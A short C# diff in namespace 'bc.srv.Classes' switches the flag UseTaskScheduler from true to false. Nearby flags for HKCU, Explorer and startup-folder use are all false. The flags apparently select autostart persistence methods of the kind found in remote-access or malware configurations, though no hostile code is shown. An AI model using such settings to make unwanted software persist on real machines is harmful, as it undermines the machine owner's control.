@@ -17,7 +17,7 @@ namespace bc.srv.Classes
 
 
 
-            SrvData.Instance.UseTaskScheduler = true;
+            SrvData.Instance.UseTaskScheduler = false;
             SrvData.Instance.BUseHkcu = false;
             SrvData.Instance.bUseExplorer = false;
             SrvData.Instance.bUseStartupFolder = false;
